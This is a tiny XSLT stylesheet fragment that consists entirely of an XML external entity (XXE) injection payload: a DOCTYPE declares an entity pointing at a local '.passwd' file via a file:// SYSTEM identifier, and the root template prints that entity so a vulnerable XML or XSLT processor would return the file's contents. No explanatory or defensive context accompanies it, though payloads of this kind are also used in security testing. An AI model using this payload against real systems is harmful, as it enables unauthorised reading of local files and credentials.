<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file://.passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
